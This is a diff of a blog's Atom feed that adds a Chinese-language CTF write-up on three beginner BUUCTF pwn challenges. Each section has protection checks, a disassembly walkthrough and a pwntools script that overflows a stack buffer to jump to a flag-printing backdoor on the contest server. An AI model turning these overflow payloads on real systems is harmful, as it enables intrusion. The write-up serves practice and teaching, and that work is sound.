@@ -2,14 +2,92 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://m0sway.github.io</id>
     <title>m0sway</title>
-    <updated>2020-10-22T08:22:15.912Z</updated>
+    <updated>2021-01-09T14:38:53.061Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://m0sway.github.io"/>
     <link rel="self" href="https://m0sway.github.io/atom.xml"/>
     <subtitle>m0sway&apos;s blog.</subtitle>
     <logo>https://m0sway.github.io/images/avatar.png</logo>
     <icon>https://m0sway.github.io/favicon.ico</icon>
-    <rights>All rights reserved 2020, m0sway</rights>
+    <rights>All rights reserved 2021, m0sway</rights>
+    <entry>
+        <title type="html"><![CDATA[BUU-PWN题详解]]></title>
+        <id>https://m0sway.github.io/post/buu-pwn-ti-xiang-jie/</id>
+        <link href="https://m0sway.github.io/post/buu-pwn-ti-xiang-jie/">
+        </link>
+        <updated>2021-01-09T13:22:42.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="test_your_nc">test_your_nc</h1>
+<p>直接连接即可：<br>
+<img src="https://m0sway.github.io/post-images/1610198782295.png" alt="" loading="lazy"></p>
+<h1 id="rip">rip</h1>
+<p>先用<code>checksec</code>来看下保护：<br>
+<img src="https://m0sway.github.io/post-images/1610199038756.png" alt="" loading="lazy"><br>
+是一个64位的程序，关闭了所有的保护，并且还有RWX segments<br>
+拖进IDA里面查看，可以看到有一个名为<code>fun</code>的后门函数<br>
+<img src="https://m0sway.github.io/post-images/1610199208012.png" alt="" loading="lazy"><br>
+主函数如下：<br>
+<img src="https://m0sway.github.io/post-images/1610199494886.png" alt="" loading="lazy"><br>
+利用<code>gets</code>函数读取用户输入的数据，s参数离栈底部0xF个字节。<br>
+so 就是一个ret2text的题目，代码如下：</p>
+<pre><code>from pwn import *
+
+#context.log_level='debug'
+sys_addr = 0x401186
+# r = process(&quot;./pwn1&quot;)
+r = remote(&quot;node3.buuoj.cn&quot;,27439)
+r.recv()
+payload = b'M' * (0xf + 8)  + p64(sys_addr)
+r.sendline(payload)
+
+r.interactive()
+</code></pre>
+<h1 id="warmup_csaw_2016">warmup_csaw_2016</h1>
+<p>先用<code>checksec</code>来看下保护：<br>
+<img src="https://m0sway.github.io/post-images/1610201505036.png" alt="" loading="lazy"><br>
+是一个64位的程序，关闭了所有的保护，并且还有RWX segments<br>
+拖进IDA，主函数如下：<br>
+<img src="https://m0sway.github.io/post-images/1610201597409.png" alt="" loading="lazy"><br>
+可以看到输出了一个函数的地址，跟进函数看下<br>
+<img src="https://m0sway.github.io/post-images/1610201773079.png" alt="" loading="lazy"><br>
+是一个后门函数调用系统命令<code>cat flag</code>，所以我们应该就想办法调用这个函数。<br>
+回到主函数看看，最后用<code>gets</code>函数向<code>v5</code>写入数据，那么就存在一个溢出。<br>
+<code>v5</code>到栈底的距离是<code>0x40</code> so:</p>
+<pre><code>from pwn import *
+
+r = remote(&quot;node3.buuoj.cn&quot;,27089)
+#r = process(&quot;./warmup_csaw_2016&quot;)
+r.recvuntil(&quot;WOW:&quot;)
+addr = int(r.recv(8).decode(),16)
+print(addr)
+payload = b'M' * (0x40 + 8) + p64(addr)
+r.sendlineafter(&quot;&gt;&quot;,payload)
+
+r.interactive()
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://m0sway.github.io/post-images/1610202191449.png" alt="" loading="lazy"></figure>
+<h1 id="pwn1_sctf_2016">pwn1_sctf_2016</h1>
+<p>先用<code>checksec</code>来看下保护：<br>
+<img src="https://m0sway.github.io/post-images/1610202466424.png" alt="" loading="lazy"><br>
+是一个32位的程序，NX enabled、Partial RELRO<br>
+拖进IDA，主函数如下：<br>
+<img src="https://m0sway.github.io/post-images/1610202490014.png" alt="" loading="lazy"><br>
+存在漏洞的函数已经被标记出来了，直接跟进看：<br>
+<img src="https://m0sway.github.io/post-images/1610202539464.png" alt="" loading="lazy"><br>
+分配的s空间为60，限制输入32，初步看是不会造成栈溢出的，但是下面有一个字符替换，就是输入I会被替换成you。I是一个字符，you是三个字符，那么我们可以输入20个I（满足32的限制），那么这20个I，最终被替换成了60个字符，从而造成溢出</p>
+<p>用F12搜索下全局的字符串，会发现有一个<code>cat flag.txt</code>，跟进获取到该函数的地址为<code>0x8048F0D</code><br>
+<img src="https://m0sway.github.io/post-images/1610202762621.png" alt="" loading="lazy"><br>
+代码如下：</p>
+<pre><code>from pwn import *
+
+r = remote(&quot;node3.buuoj.cn&quot;,25658)
+payload = b'I'*20 + b'M'*4 + p32(0x8048F0D)
+r.recv()
+r.sendline(payload)
+
+r.interactive()
+</code></pre>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[未授权访问漏洞总结]]></title>
         <id>https://m0sway.github.io/post/wei-shou-quan-fang-wen-lou-dong-zong-jie/</id>
